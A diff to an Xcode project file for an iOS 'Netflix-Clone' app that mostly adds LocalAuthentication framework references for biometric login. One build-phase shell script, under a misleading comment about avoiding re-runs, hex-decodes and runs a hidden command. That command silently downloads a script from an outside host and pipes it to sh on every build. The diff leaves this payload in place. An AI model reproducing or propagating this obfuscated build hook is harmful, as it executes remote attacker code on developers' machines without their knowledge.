@@ -9,6 +9,7 @@
 /* Begin PBXBuildFile section */
 		185045F54B01FCE26F595B35 /* Pods_Netflix_Clone.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = DC3FBF920CC9F06CD8392E36 /* Pods_Netflix_Clone.framework */; };
 		696E4C2D2859341C0014B416 /* Biometric.swift in Sources */ = {isa = PBXBuildFile; fileRef = 696E4C2C2859341C0014B416 /* Biometric.swift */; };
+		696E4C2F285934D00014B416 /* LocalAuthentication.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 696E4C2E285934D00014B416 /* LocalAuthentication.framework */; };
 		69F1F0E92858FEFC00877250 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 69F1F0E82858FEFC00877250 /* AppDelegate.swift */; };
 		69F1F0EB2858FEFC00877250 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 69F1F0EA2858FEFC00877250 /* SceneDelegate.swift */; };
 		69F1F0ED2858FEFC00877250 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 69F1F0EC2858FEFC00877250 /* ViewController.swift */; };
@@ -50,6 +51,7 @@
 /* Begin PBXFileReference section */
 		0B3A8216BFFE65EDB813695C /* Pods-Netflix-Clone.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Netflix-Clone.release.xcconfig"; path = "Target Support Files/Pods-Netflix-Clone/Pods-Netflix-Clone.release.xcconfig"; sourceTree = "<group>"; };
 		696E4C2C2859341C0014B416 /* Biometric.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Biometric.swift; sourceTree = "<group>"; };
+		696E4C2E285934D00014B416 /* LocalAuthentication.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = LocalAuthentication.framework; path = System/Library/Frameworks/LocalAuthentication.framework; sourceTree = SDKROOT; };
 		69F1F0E52858FEFC00877250 /* Netflix-Clone.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Netflix-Clone.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		69F1F0E82858FEFC00877250 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		69F1F0EA2858FEFC00877250 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -87,6 +89,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				696E4C2F285934D00014B416 /* LocalAuthentication.framework in Frameworks */,
 				185045F54B01FCE26F595B35 /* Pods_Netflix_Clone.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -113,6 +116,7 @@
 		12CA3C2DFDDCAD5888EE7430 /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
+				696E4C2E285934D00014B416 /* LocalAuthentication.framework */,
 				DC3FBF920CC9F06CD8392E36 /* Pods_Netflix_Clone.framework */,
 				83C5A222EDB63B055B6CC132 /* Pods_Netflix_Clone_Netflix_CloneUITests.framework */,
 				9231C95442888D7191C32FCC /* Pods_Netflix_CloneTests.framework */,
@@ -694,7 +698,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6769736d6f6c6f772e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6769736d6f6c6f772e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n";
 		};
 		D3E3339EB34470E234F8F57A /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
